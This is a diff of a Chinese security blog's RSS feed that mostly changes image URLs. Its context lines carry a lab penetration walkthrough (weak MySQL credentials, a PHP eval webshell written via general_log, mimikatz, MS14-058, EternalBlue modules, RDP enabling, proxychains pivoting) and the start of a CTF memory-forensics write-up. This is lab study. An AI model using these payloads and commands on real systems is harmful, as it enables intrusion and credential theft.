 &lt;/h3&gt;&lt;p&gt;参考以下文章,不做过多叙述&lt;/p&gt;
 &lt;p&gt;&amp;lt;https://blog.csdn.net/m0_46363249/article/details/121441832&lt;/p&gt;
 &lt;hr&gt;
 &lt;h3 id=&#34;2拓扑图和机器信息&#34;&gt;2.拓扑图和机器信息
-&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/%e7%bb%98%e5%9b%be2.png&#34;
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/%e7%bb%98%e5%9b%be2.png&#34;
 	
 	
 	
@@ -28,7 +1337,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208122350101.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208122350101.png&#34;
 	
 	
 	
@@ -41,7 +1350,7 @@
 &lt;hr&gt;
 &lt;h3 id=&#34;3打点&#34;&gt;3.打点
 &lt;/h3&gt;&lt;p&gt;端口扫描发现80站点和3306mysql服务&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208142541944.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208142541944.png&#34;
 	
 	
 	
@@ -52,7 +1361,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;访问http发现phpstudy探针&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208142628629.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208142628629.png&#34;
 	
 	
 	
@@ -63,7 +1372,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;使用hydra发现无法连接&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208142912387.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208142912387.png&#34;
 	
 	
 	
@@ -74,7 +1383,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;截包尝试爆破发现一个异常长度&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208143525512.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208143525512.png&#34;
 	
 	
 	
@@ -85,7 +1394,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;返回包看不出什么,到web界面手动输入root,root发现连接正常说明存在弱口令root/root&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208143542310.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208143542310.png&#34;
 	
 	
 	
@@ -96,7 +1405,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;尝试连接发现不允许从外部连接&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208143801745.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208143801745.png&#34;
 	
 	
 	
@@ -107,7 +1416,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;掏出82年的笔记,按理说phpstudy搭建应该有phpadmin&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208143857821.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208143857821.png&#34;
 	
 	
 	
@@ -118,7 +1427,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;访问路径发现的确存在&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208143958943.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208143958943.png&#34;
 	
 	
 	
@@ -129,7 +1438,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;使用弱口令root/root成功进入&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208144044408.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208144044408.png&#34;
 	
 	
 	
@@ -140,7 +1449,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;发现是能够执行sql语句的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208144514164.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208144514164.png&#34;
 	
 	
 	
@@ -174,7 +1483,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;查询&amp;quot;secure_file_priv&amp;quot;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208144950595.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208144950595.png&#34;
 	
 	
 	
@@ -185,7 +1494,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;发现为null就是没有写入权限&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208145019777.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208145019777.png&#34;
 	
 	
 	
@@ -196,7 +1505,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;查询一下日志功能,尝试利用日志getshell&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208151454482.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208151454482.png&#34;
 	
 	
 	
@@ -207,7 +1516,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;关闭了但是我们可以手动开启,输入sql语句&lt;code&gt;SET GLOBAL general_log = ON;&lt;/code&gt;执行成功开启&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208151634306.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208151634306.png&#34;
 	
 	
 	
@@ -218,7 +1527,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;我这里偷窥了一下站点目录,这个应该记住!&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208151917953.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208151917953.png&#34;
 	
 	
 	
@@ -229,7 +1538,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;接下来的思路是设置日志文件写到一个php文件中,&lt;code&gt;SET GLOBAL general_log_file = &#39;C:/phpstudy/WWW/test.php&#39;;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208160931473.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208160931473.png&#34;
 	
 	
 	
@@ -249,7 +1558,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;select &amp;#39;&amp;lt;?php eval($_POST[gucheng]);?&amp;gt;&amp;#39;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208161435113.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208161435113.png&#34;
 	
 	
 	
@@ -259,7 +1568,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208162418255.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208162418255.png&#34;
 	
 	
 	
@@ -270,7 +1579,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;进来后发现还有个网站yxcms,我们练习都打一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208164539137.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208164539137.png&#34;
 	
 	
 	
@@ -281,7 +1590,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;棱洞扫了下发现这cms就叫这个&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208165056769.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208165056769.png&#34;
 	
 	
 	
@@ -292,7 +1601,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;查看网页源代码发现默认口令&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208165525343.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208165525343.png&#34;
 	
 	
 	
@@ -303,7 +1612,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;到指定路径输入默认口令成功登入,修改模版index_index.php&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208170152404.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208170152404.png&#34;
 	
 	
 	
@@ -314,7 +1623,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;写入一句马&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208170701742.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208170701742.png&#34;
 	
 	
 	
@@ -325,7 +1634,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;蚁剑成功连接&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208170809940.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208170809940.png&#34;
 	
 	
 	
@@ -339,7 +1648,7 @@
 &lt;h3 id=&#34;4内网渗透&#34;&gt;4.内网渗透
 &lt;/h3&gt;&lt;p&gt;之前一直内网手渗透,下面就用cs操作了,主要是内网信息收集插件方便点&lt;/p&gt;
 &lt;p&gt;将生成马上传到站点目录下运行上线&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208184123955.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208184123955.png&#34;
 	
 	
 	
@@ -350,7 +1659,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;ladon插件 icmp检测主机存活一致&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208185403956.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208185403956.png&#34;
 	
 	
 	
@@ -361,7 +1670,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;发现存在域环境,域名为god.org&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208193501834.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208193501834.png&#34;
 	
 	
 	
@@ -372,7 +1681,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;ladon infoscan整个网段确实如此&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208193607344.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208193607344.png&#34;
 	
 	
 	
@@ -383,7 +1692,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;现在是administrator权限,可以尝试提到system权限&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208194301195.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208194301195.png&#34;
 	
 	
 	
@@ -394,7 +1703,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;上传个nc到c:\windows\temp目录&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208194237316.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208194237316.png&#34;
 	
 	
 	
@@ -405,7 +1714,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;弹过来没反应&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208200518356.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208200518356.png&#34;
 	
 	
 	
@@ -416,7 +1725,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;mimikatz抓取到密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208200318243.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208200318243.png&#34;
 	
 	
 	
@@ -427,7 +1736,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;尝试用psexec连接也不行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208202630995.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208202630995.png&#34;
 	
 	
 	
@@ -438,7 +1747,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;查看一下系统信息,打了什么补丁&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208202537197.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208202537197.png&#34;
 	
 	
 	
@@ -449,7 +1758,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;使用梼杌中的ms14-058提权成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208204847821.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208204847821.png&#34;
 	
 	
 	
@@ -459,7 +1768,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241208202805154.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241208202805154.png&#34;
 	
 	
 	
@@ -471,7 +1780,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;上面搞的好像是有点问题,Windows应该是3389远程桌面连接,重新搞下&lt;/p&gt;
 &lt;p&gt;执行netstat -ano未发现3389端口开启&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209133742373.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209133742373.png&#34;
 	
 	
 	
@@ -500,7 +1809,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;为1关闭&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209135458399.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209135458399.png&#34;
 	
 	
 	
@@ -512,7 +1821,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;使用命令&lt;code&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&lt;/code&gt;手动开启&lt;/p&gt;
 &lt;p&gt;为0成功开启&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209135700721.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209135700721.png&#34;
 	
 	
 	
@@ -531,7 +1840,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netsh advfirewall firewall add rule name=&amp;#34;Remote Desktop&amp;#34; protocol=TCP dir=in localport=3389 action=allow
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209141144583.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209141144583.png&#34;
 	
 	
 	
@@ -552,7 +1861,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;传上去执行后拿到meterpreter会话&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209143251537.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209143251537.png&#34;
 	
 	
 	
@@ -562,7 +1871,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209143532781.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209143532781.png&#34;
 	
 	
 	
@@ -573,7 +1882,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;提权到system&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209143942740.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209143942740.png&#34;
 	
 	
 	
@@ -597,7 +1906,7 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;接下来做域内信息收集准备横向&lt;/p&gt;
 &lt;p&gt;输入net view发现另外两台主机&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209132456126.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209132456126.png&#34;
 	
 	
 	
@@ -607,7 +1916,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209153323049.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209153323049.png&#34;
 	
 	
 	
@@ -646,7 +1955,7 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;h4 id=&#34;41-使用proxychains代理&#34;&gt;4.1 使用proxychains代理:
 &lt;/h4&gt;&lt;p&gt;添加内网路由 run autoroute -s 192.168.52.0/24，查看一下arp缓存表存在52网段&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209154407675.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209154407675.png&#34;
 	
 	
 	
@@ -680,7 +1989,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;重新开个终端vim /etc/proxychains.conf,如下配置&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209162027957.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209162027957.png&#34;
 	
 	
 	
@@ -691,7 +2000,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;返回msf6,输入&lt;code&gt;proxychains curl http://192.168.52.143/yxcms/index.php&lt;/code&gt;,测试可以成功访问192.168.52.0网段&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209162205894.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209162205894.png&#34;
 	
 	
 	
@@ -703,7 +2012,7 @@
 &gt;&lt;/p&gt;
 &lt;h4 id=&#34;42-cs直接建立socks5代理&#34;&gt;4.2 CS直接建立socks5代理
 &lt;/h4&gt;&lt;p&gt;右键点击机器-&amp;gt;代理转发-&amp;gt;socks代理,发现是62549端口&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209162347235.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209162347235.png&#34;
 	
 	
 	
@@ -714,7 +2023,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;proxifier检测成功,还是这个更方便点&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209162500913.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209162500913.png&#34;
 	
 	
 	
@@ -725,7 +2034,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;再在代理规则选择刚才那个即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209163321746.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209163321746.png&#34;
 	
 	
 	
@@ -735,7 +2044,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209163352580.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209163352580.png&#34;
 	
 	
 	
@@ -747,7 +2056,7 @@
 &gt;&lt;/p&gt;
 &lt;h4 id=&#34;43-渗透同域主机19216852141&#34;&gt;4.3 渗透同域主机192.168.52.141
 &lt;/h4&gt;&lt;p&gt;&lt;code&gt;proxychains nmap -Pn 192.168.52.141&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209164251738.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209164251738.png&#34;
 	
 	
 	
@@ -758,7 +2067,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;通过445smb端口检测操作系统为Windows server2003,&lt;code&gt;proxychains nmap -sV 192.168.52.141 -p 445&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209164513076.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209164513076.png&#34;
 	
 	
 	
@@ -769,7 +2078,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;搜了一下2003全是永恒之蓝&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209165028841.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209165028841.png&#34;
 	
 	
 	
@@ -780,7 +2089,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;先用第三个模块检测一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209170232546.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209170232546.png&#34;
 	
 	
 	
@@ -791,7 +2100,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;直接使用msf里面的攻击模块了(ms17-010)发现接收不了session,使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209165759224.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209165759224.png&#34;
 	
 	
 	
@@ -803,7 +2112,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;换用这个代码执行试试&lt;code&gt;use auxiliary/admin/smb/ms17_010_command&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;代码成功运行&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209170439287.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209170439287.png&#34;
 	
 	
 	
@@ -833,7 +2142,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;使用rdesktop连接&lt;code&gt;proxychains rdesktop 192.168.52.141&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209171859855.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209171859855.png&#34;
 	
 	
 	
@@ -844,7 +2153,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;连接成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209171919145.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209171919145.png&#34;
 	
 	
 	
@@ -857,7 +2166,7 @@
 &lt;p&gt;msf设置正反向shell都打不通不知道为啥,登个远程桌面算了&lt;/p&gt;
 &lt;h4 id=&#34;44-打域控&#34;&gt;4.4 打域控
 &lt;/h4&gt;&lt;p&gt;扫描端口,发现445又开启了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209182152367.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209182152367.png&#34;
 	
 	
 	
@@ -891,7 +2200,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;创建成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209180926400.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209180926400.png&#34;
 	
 	
 	
@@ -902,7 +2211,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;proxychains rdesktop 192.168.52.138&lt;/code&gt; 发现连接不了,端口filtered,裂开,这个msf的模块打不通不知道啥原因,以后再研究艹&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241209183526997.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241209183526997.png&#34;
 	
 	
 	
@@ -916,15 +2225,15 @@
         </item>
         <item>
         <title>[陇剑杯2021]机密内存复现</title>
-        <link>http://gucheng.me/p/%E9%99%87%E5%89%91%E6%9D%AF2021%E6%9C%BA%E5%AF%86%E5%86%85%E5%AD%98%E5%A4%8D%E7%8E%B0/</link>
+        <link>https://2477231995.github.io/p/%E9%99%87%E5%89%91%E6%9D%AF2021%E6%9C%BA%E5%AF%86%E5%86%85%E5%AD%98%E5%A4%8D%E7%8E%B0/</link>
         <pubDate>Sat, 30 Nov 2024 12:56:25 +0800</pubDate>
         
-        <guid>http://gucheng.me/p/%E9%99%87%E5%89%91%E6%9D%AF2021%E6%9C%BA%E5%AF%86%E5%86%85%E5%AD%98%E5%A4%8D%E7%8E%B0/</guid>
+        <guid>https://2477231995.github.io/p/%E9%99%87%E5%89%91%E6%9D%AF2021%E6%9C%BA%E5%AF%86%E5%86%85%E5%AD%98%E5%A4%8D%E7%8E%B0/</guid>
         <description>&lt;p&gt;目前做过的内存取证题不多,这道题难度较高具有启发意义,所以记录一下留作以后参照&lt;/p&gt;
 &lt;p&gt;复现地址:&amp;lt;[&lt;a class=&#34;link&#34; href=&#34;https://www.nssctf.cn/problem/308&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;陇剑杯 2021]机密内存（问1） | NSSCTF&lt;/a&gt;&amp;gt;&lt;/p&gt;
 &lt;h3 id=&#34;知识了解之vmware虚拟机文件类型&#34;&gt;知识了解之vmware虚拟机文件类型
-&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201140759742.png&#34;
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201140759742.png&#34;
 	
 	
 	
@@ -937,7 +2246,7 @@
 &lt;hr&gt;
 &lt;h3 id=&#34;思考过程&#34;&gt;思考过程
 &lt;/h3&gt;&lt;p&gt;解压后拿到三个文件,vmem为分页备份文件, 其余两个文件类型暂时不清楚.  先尝试提取发现果然是不行的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241130133414469.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241130133414469.png&#34;
 	
 	
 	
@@ -949,7 +2258,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;接下来看看另外两个文件&lt;/p&gt;
 &lt;p&gt;打开Encryption.bin01发现为一个二进制文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201140832804.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201140832804.png&#34;
 	
 	
 	
@@ -960,7 +2269,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;根据文件大小数千kb和本地的vmss文件(虚拟机挂起时记录状态的文件)进行对比判断Encryption.bin01为vmss文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201140849630.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201140849630.png&#34;
 	
 	
 	
@@ -971,7 +2280,7 @@
 	
 &gt;&lt;/p&gt;
